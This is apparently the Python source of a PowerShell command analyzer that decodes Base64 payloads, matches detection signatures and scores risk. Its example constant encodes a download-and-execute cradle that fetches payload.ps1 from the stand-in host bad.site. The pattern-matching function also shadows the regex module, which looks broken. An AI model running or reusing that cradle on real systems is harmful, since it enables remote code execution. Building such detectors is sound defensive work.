"""PowerShell Analyzer Service
"""
import regex
import time
import json
import secrets
import string
import base64
from services.session_manager import get_supabase_client
from config.settings import CACHE_DURATION

# Detector registry - add new detectors in services/detectors/__init__.py
from services import detectors

# Sanitization module for pre-analysis command processing
from services.sanitization import apply_sanitization, get_detected_indicator_names

# ✅ Example command that doesn't count towards quota
EXAMPLE_ENCODED_COMMAND = 'powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGIAYQBkAC4AcwBpAHQAZQAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA'

try:
    import ppdeep
    PPDEEP_AVAILABLE = True
except ImportError:
    PPDEEP_AVAILABLE = False
        


signatures_cache = None
cache_timestamp = 0


def generate_short_id(length: int = 8) -> str:
    characters = string.ascii_lowercase + string.digits
    return ''.join(secrets.choice(characters) for _ in range(length))


async def load_signatures_from_db(user_id: str = None) -> list:
    """Load signatures with optimized caching"""
    global signatures_cache, cache_timestamp
    
    try:
        now = int(time.time() * 1000)
        
        # ✅ OPTIMIZATION: Skip premium check if cache is valid
        cache_key = "signatures_free"  # Default
        
        is_premium_user = False
        if user_id:
            supabase = get_supabase_client()
            profile_response = supabase.table('profiles').select('is_premium_user').eq('id', user_id).single().execute()
            if profile_response.data:
                is_premium_user = profile_response.data.get('is_premium_user', False)
        
        # ✅ Update cache key after premium check
        cache_key = f"signatures_{'premium' if is_premium_user else 'free'}"
        
        # ✅ OPTIMIZATION: Return cached signatures immediately
        if signatures_cache and cache_timestamp and cache_key in signatures_cache and (now - cache_timestamp) < CACHE_DURATION:
            return signatures_cache[cache_key]
        
        supabase = get_supabase_client()
        
        
        # Query standard signatures
        query = supabase.table('powershell_signatures').select('*').eq('is_active', True)
        
        if not is_premium_user:
            query = query.eq('is_premium_indicator', False)
        
        response = query.order('basescore', desc=True).execute()
        signatures_data = response.data if response.data else []

        
        query_premium = supabase.table('premium_indicators').select('*').eq('is_active', True)
        
        response_premium = query_premium.order('basescore', desc=True).execute()
        
        if response_premium.data:
            signatures_data.extend(response_premium.data)
        
        if signatures_data:
            public_indicators_response = supabase.table('public_indicators').select('name').execute()
            public_indicator_names = {item['name'] for item in public_indicators_response.data} if public_indicators_response.data else set()

            converted_signatures = []
            for sig in signatures_data:
                # determine indicator type
                sig_name = sig.get("name", "Unknown")
                indicator_type = "community" if sig_name in public_indicator_names else "private"
                
                # Construct dynamic GitHub link for community indicators
                link = None
                if indicator_type == "community":
                    file_path = sig.get("file_path", "")
                    # Extract filename from path (e.g., indicators/name.yaml -> name.yaml)
                    if file_path:
                        filename = file_path.split("/")[-1]
                        link = f"https://github.com/avasero/psexposed/blob/main/indicators/{filename}"
                
                converted_signatures.append({
                    "name": sig_name,
                    "patterns": sig.get("patterns", []) if isinstance(sig.get("patterns"), list) else [],
                    "severity": sig.get("severity", "unknown"),
                    "tactics": sig.get("tactics", []) if isinstance(sig.get("tactics"), list) else [],
                    "techniques": sig.get("techniques", []) if isinstance(sig.get("techniques"), list) else [],
                    "score": float(sig.get("basescore", 0)),
                    "description": sig.get("description", "No description available"),
                    "reference": sig.get("reference", []) if isinstance(sig.get("reference"), list) else [],
                    "max_match": int(sig.get("max_match", 1)),
                    "link": link,
                    "is_premium_indicator": sig.get("is_premium_indicator", False),
                    "indicator_type": indicator_type 
                })
            
            
            if not signatures_cache:
                signatures_cache = {}
            
            signatures_cache[cache_key] = converted_signatures
            cache_timestamp = now
            
            return converted_signatures
        else:
            print("No signatures found in database")
            return []
            
    except Exception as error:
        print(f"[ERROR] Loading signatures: {type(error).__name__}")
        return []


def decode_base64_utf16(encoded_str: str) -> str:
    try:
        encoded_str = encoded_str.replace(' ', '').replace('\n', '').replace('\r', '')
        
        if not encoded_str:
            return ""
        
        decoded_bytes = base64.b64decode(encoded_str + '===', validate=False)
        decoded_text = decoded_bytes.decode('utf-16-le', errors='ignore')
        
        return decoded_text
        
    except Exception:
        try:
            decoded_bytes = base64.b64decode(encoded_str, validate=False)
            return decoded_bytes.decode('utf-16-le', errors='ignore')
        except Exception:
            return ""


def decode_powershell(command: str) -> tuple:
    """
    Decode a PowerShell command through multiple layers.
    
    Handles:
    - Base64 encoded commands (-EncodedCommand)
    - Format string resolution ("{0}{1}" -f "a","b")
    
    Args:
        command: Raw PowerShell command to decode
        
    Returns:
        tuple: (final_command, decode_iterations, processing_type, decoded_layers)
            - final_command: The fully decoded command
            - decode_iterations: Number of Base64 decoding passes
            - processing_type: "none", "base64_decoded", or "format_decoded"
            - decoded_layers: List of intermediate decoded states
    """
    current_command = command
    max_decode_iterations = 5
    iteration = 0
    processing_type = "none"
    decoded_layers = []
    successfully_decoded = False
    
    
   
    while iteration < max_decode_iterations:
        encoded_match = regex.search(
            detectors.ENCODED_COMMAND_PATTERN,
            current_command,
            regex.IGNORECASE
        )
        
        if encoded_match:
            iteration += 1
            payload_b64 = encoded_match.group(1)
            decoded_payload = decode_base64_utf16(payload_b64)
            
            is_valid_decode = (
                len(decoded_payload) > 0 and
                decoded_payload != payload_b64
            )
            
            if is_valid_decode:
                decoded_layers.append({
                    "iteration": iteration,
                    "decoded": decoded_payload
                })
                
                current_command = decoded_payload
                processing_type = "base64_decoded"
                successfully_decoded = True
                
                # Check for nested encoding
                has_more_encoding = regex.search(
                    detectors.ENCODED_COMMAND_PATTERN,
                    decoded_payload,
                    regex.IGNORECASE
                )
                
                if not has_more_encoding:
                    break
            else:
                iteration -= 1
                break
        else:
            break
    
    base64_iterations = iteration if successfully_decoded else 0

    if base64_iterations > 0:
        return current_command, base64_iterations, processing_type, decoded_layers
    
    return command, 0, "none", []


def analyze_command_patterns(command: str, signatures: list) -> dict:
    """
    Analyzes PowerShell command for malicious patterns.
    
    Handles format string decoding and Base64 decoding before pattern matching.
    
    Args:
        command: Raw PowerShell command to analyze
        signatures: List of signature dictionaries to match against
        
    Returns:
        dict: Analysis results including detected_signatures, total_score, etc.
    """
    encoding_result = detectors.detect_encoded_command(command)
    
    first_decoded = None
    double_decoded = None
    
    if encoding_result["is_encoded"]:
        first_decoded = encoding_result.get("decoded_preview")
        
        if first_decoded:
            double_encoding_result = detectors.detect_double_encoded_command(
                command=command,
                decoded_command=first_decoded,
                decode_iterations=1
            )
            
            if double_encoding_result["is_double_encoded"]:
                double_decoded = double_encoding_result.get("second_level_decoded")
    
    detected_signatures = []
    total_score = 0.0
    tactics_set = set()
    techniques_set = set()
    
    raw_command = command
    
    fully_decoded, decode_iterations, processing_type, decoded_layers = decode_powershell(command)
    has_decoded = fully_decoded != command
    
    first_decoded_layer = None
    second_decoded_layer = None
    
    if decoded_layers:
        if len(decoded_layers) >= 1:
            first_decoded_layer = decoded_layers[0]["decoded"]
        if len(decoded_layers) >= 2:
            second_decoded_layer = decoded_layers[1]["decoded"]
    
    
    
    
   
    
    # TODO: Add obfuscation detector here later (will be added via signatures database)
    
    
    if decode_iterations >= 2:
        double_encoded_sig = next((sig for sig in signatures if sig.get("name") == "Double Encoded Command Detected"), None)
        
        if double_encoded_sig:
            
            detected_signatures.append({
                "name": "Double Encoded Command Detected",
                "description": f"Multiple layers of Base64 encoding detected: {decode_iterations} nested -EncodedCommand parameters found",
                "severity": double_encoded_sig["severity"],
                "base_score": double_encoded_sig["score"],
                "matches_found": 1,
                "total_score": double_encoded_sig["score"],
                "max_match_allowed": 1,
                "pattern": f"{decode_iterations}_layer_encoding",
                "matches_details": [{
                    "matched_text": f"Layer 1: {first_decoded_layer[:80] if first_decoded_layer else 'N/A'}...",
                    "position": {"start": 0, "end": len(raw_command)},
                    "match_number": 1,
                    "matched_in": "original"
                }],
                "tactics": double_encoded_sig.get("tactics", ["Defense Evasion"]),
                "techniques": double_encoded_sig.get("techniques", ["T1027.010", "T1140"]),
                "reference": double_encoded_sig.get("reference", []),
                "link": double_encoded_sig.get("link"),
                "is_premium_indicator": False,
                "indicator_type": double_encoded_sig.get("indicator_type", "community"),
                "found_in_decoded": False
            })
            
            tactics_set.update(double_encoded_sig.get("tactics", ["Defense Evasion"]))
            techniques_set.update(double_encoded_sig.get("techniques", ["T1027.010", "T1140"]))
            total_score += double_encoded_sig["score"]
            
    
    encoding_detection = detectors.detect_encoded_command(raw_command)
    
    
    
    if encoding_detection["is_encoded"]:
        encoded_sig = next((sig for sig in signatures if sig.get("name") == "Encoded Command Detected"), None)
        
        if encoded_sig:
            detected_signatures.append({
                "name": "Encoded Command Detected",
                "description": f"Command encoding detected: {encoding_detection['indicator']} (confidence: {encoding_detection['confidence']:.0%})",
                "severity": encoded_sig["severity"],
                "base_score": encoded_sig["score"],
                "matches_found": 1,
                "total_score": encoded_sig["score"],
                "max_match_allowed": 1,
                "pattern": encoding_detection["type"],
                "matches_details": [{
                    "matched_text": encoding_detection.get("decoded_preview", "Unable to decode"),
                    "position": {"start": 0, "end": len(raw_command)},
                    "match_number": 1,
                    "matched_in": "original"
                }],
                "tactics": encoded_sig.get("tactics", ["Defense Evasion"]),
                "techniques": encoded_sig.get("techniques", ["T1027", "T1027.001", "T1140"]),
                "reference": encoded_sig.get("reference", []),
                "link": encoded_sig.get("link"),
                "is_premium_indicator": False,
                "indicator_type": encoded_sig.get("indicator_type", "community"),
                "found_in_decoded": False
            })
            
            tactics_set.update(encoded_sig.get("tactics", ["Defense Evasion"]))
            techniques_set.update(encoded_sig.get("techniques", ["T1027", "T1027.001", "T1140"]))
            total_score += encoded_sig["score"]
            

    
    has_encoded_command_indicator = any(
        sig.get("name") == "Encoded Command Detected" 
        for sig in detected_signatures
    )
    
    
    commands_to_analyze = [raw_command]
    
    
    commands_set = {raw_command}
    
    # Add base64 decoded command from decode_powershell
    if decode_iterations >= 1 and fully_decoded and fully_decoded != command:
        commands_set.add(fully_decoded)
    
    # Add first_decoded from detect_encoded_command (may be different/more complete)
    if first_decoded and first_decoded != command:
        commands_set.add(first_decoded)
    
    # Add double decoded if available
    if double_decoded:
        commands_set.add(double_decoded)
    
    commands_to_analyze = list(commands_set)
    
    # ✅ OPTIMIZATION: Pre-filter signatures to skip
    skip_signatures = {"Obfuscation Detected", "Encoded Command Detected", "Double Encoded Command Detected"}
    if has_encoded_command_indicator:
        skip_signatures.add("Long base64 strings")
    
    for signature in signatures:
        if signature.get("name") in skip_signatures:
            continue
        
        all_signature_matches = []
        matched_pattern = None
        matched_in_decoded = False
        
        for cmd_to_test in commands_to_analyze:
            # Mark as decoded if it's any version other than the original
            is_decoded_version = (cmd_to_test != raw_command)
            
            for pattern in signature["patterns"]:
                try:
                    regex = regex.compile(pattern, regex.IGNORECASE)
                    pattern_matches = list(regex.finditer(cmd_to_test))
                    
                    if pattern_matches:
                        if matched_pattern is None:
                            matched_pattern = pattern
                        
                        if is_decoded_version:
                            matched_in_decoded = True
                        
                        for match in pattern_matches:
                            matched_text = match.group(0)
                            match_start = match.start()
                            match_end = match.end()
                            
                            all_signature_matches.append({
                                "matched_text": matched_text,
                                "position": {
                                    "start": match_start,
                                    "end": match_end
                                },
                                "matched_in": "decoded" if is_decoded_version else "original"
                            })
                            

                except regex.error:
                    continue

        unique_matches = []
        seen_positions = set()
        
        for match_info in all_signature_matches:
            position_key = (
                match_info["position"]["start"],
                match_info["position"]["end"],
                match_info["matched_text"],
                match_info["matched_in"]
            )
            if position_key not in seen_positions:
                seen_positions.add(position_key)
                unique_matches.append(match_info)
        
        matches_found = min(len(unique_matches), signature["max_match"])
        final_matches = unique_matches[:matches_found]
        
        if matches_found > 0:
            signature_total_score = signature["score"] * matches_found
            
            detected_signature = {
                "name": signature["name"],
                "description": signature["description"],
                "severity": signature["severity"],
                "base_score": signature["score"],
                "matches_found": matches_found,
                "total_score": signature_total_score,
                "max_match_allowed": signature["max_match"],
                "pattern": matched_pattern or signature["patterns"][0] if signature["patterns"] else "Unknown pattern",
                "matches_details": [
                    {
                        "matched_text": match_info["matched_text"],
                        "position": match_info["position"],
                        "match_number": i + 1,
                        "matched_in": match_info["matched_in"]
                    }
                    for i, match_info in enumerate(final_matches)
                ],
                "tactics": signature["tactics"],
                "techniques": signature["techniques"],
                "reference": signature.get("reference", []),
                "link": signature.get("link"),
                "is_premium_indicator": signature.get("is_premium_indicator", False),
                "indicator_type": signature.get("indicator_type", "community"),
                "found_in_decoded": matched_in_decoded
            }
            
            detected_signatures.append(detected_signature)
            
            tactics_set.update(signature["tactics"])
            techniques_set.update(signature["techniques"])
            total_score += signature_total_score
    
  
   
    return {
        "detected_signatures": detected_signatures,
        "total_score": total_score,
        "tactics": list(tactics_set),
        "techniques": list(techniques_set),
        "decoded_command": first_decoded,
        "double_decoded_command": double_decoded
    }


def analyze_with_sanitization(command: str, signatures: list) -> dict:
    """
    Analyzes PowerShell command with conditional sanitization.
    
    First analyzes the raw command, then applies sanitization methods
    that are triggered by specific indicators. If sanitization reveals
    new indicators, uses the sanitized version.
    
    Args:
        command: Raw PowerShell command to analyze
        signatures: List of signature dictionaries to match against
        
    Returns:
        dict: Analysis results with sanitization info included
    """
    # Helper function to extract indicator names from analysis
    def get_indicators(cmd: str) -> list[str]:
        result = analyze_command_patterns(cmd, signatures)
        return get_detected_indicator_names(result)
    
    # Apply conditional sanitization
    sanitization_result = apply_sanitization(command, get_indicators)
    
    # If sanitization was applied, analyze the sanitized command
    if sanitization_result["was_sanitized"]:
        final_command = sanitization_result["sanitized_command"]
        analysis_result = analyze_command_patterns(final_command, signatures)
        
        # Add sanitization metadata to the result
        analysis_result["sanitization"] = {
            "was_sanitized": True,
            "original_command": command,
            "applied_methods": sanitization_result["applied_sanitizations"]
        }
    else:
        # No sanitization needed, analyze original command
        analysis_result = analyze_command_patterns(command, signatures)
        analysis_result["sanitization"] = {
            "was_sanitized": False,
            "original_command": command,
            "applied_methods": []
        }
    
    return analysis_result


def calculate_severity_and_risk(total_score: float) -> str:
    """Calcula severidade baseado no score total
    Score Ranges:
    - 10.0+: Critical (Red) - Extremely notable, likely suspicious activity
    - 8.0 - 9.99: High (Orange) - Highly notable activity
    - 5.0 - 7.99: Medium (Yellow) - Fairly notable activity
    - 2.0 - 4.99: Low (Green) - Relevant activity
    - 1.0 - 1.99: Informational (Blue) - Extremely common, benign behavior
    """
    severity = "informational"
    if total_score >= 10:
        severity = "critical"
    elif total_score >= 8:
        severity = "high"
    elif total_score >= 5:
        severity = "medium"
    elif total_score >= 2:
        severity = "low"
    return severity


async def save_analysis_to_db(
    command: str,
    analysis_result: dict,
    user_id: str = None,
    session_id: str = None,
    ip_address: str = None,
    country: str = None,
    search_type: str = "API",
    user_agent: str = "FastAPI-Client",
    is_cache: bool = False
) -> dict:
    """Salva análise no banco de dados"""
    try:
        supabase = get_supabase_client()
        short_id = generate_short_id()
        
        ip_country = country if country and country != 'Unknown' else None
        
        # Extract decoded content
        decoded_cmd = analysis_result.get("decoded_command")
        double_decoded_cmd = analysis_result.get("double_decoded_command")
        
        # ✅ Check if this is the example command
        is_example_command = command.strip() == EXAMPLE_ENCODED_COMMAND.strip()
        
        # ✅ NEW: Determine if analysis has actual decoded content
        # Example command doesn't count towards quota
        has_decoded_content = bool(
            (decoded_cmd or double_decoded_cmd) and not is_example_command
        )
        
        
        insert_data = {
            "command": command,
            "decoded_command": decoded_cmd,
            "double_decoded_command": double_decoded_cmd,
            "has_decoded_content": has_decoded_content,  # ✅ NEW
            "risk_score": round(analysis_result["total_score"], 1),
            "severity": analysis_result["severity"],
            "signatures_detected": analysis_result["detected_signatures"],
            "tactics": analysis_result["tactics"],
            "techniques": analysis_result["techniques"],
            "cmdlets_detected": analysis_result.get("cmdlets_detected", []),
            "ip_address": ip_address,
            "ip_country": ip_country,
            "search_type": search_type,
            "user_agent": user_agent,
            "short_id": short_id,
            "is_cache": is_cache
        }
        
        if user_id:
            insert_data["user_id"] = user_id
        if session_id:
            insert_data["session_id"] = session_id
        
        insert_data = {k: v for k, v in insert_data.items() if v is not None}
        
        db_response = supabase.table('powershell_analyses').insert(insert_data).execute()
        if db_response.data:
            return {
                "success": True,
                "db_id": db_response.data[0].get('id'),
                "uuid": db_response.data[0].get('uuid'),
                "short_id": short_id,
            }
        else:
            return {"success": False, "error": "Failed to save analysis"}
            
    except Exception as db_error:
        print(f"[ERROR] Database error: {type(db_error).__name__}")
        return {"success": False, "error": str(db_error)}


def clear_signatures_cache():
    """Limpa o cache de assinaturas"""
    global signatures_cache, cache_timestamp
    signatures_cache = None
    cache_timestamp = 0

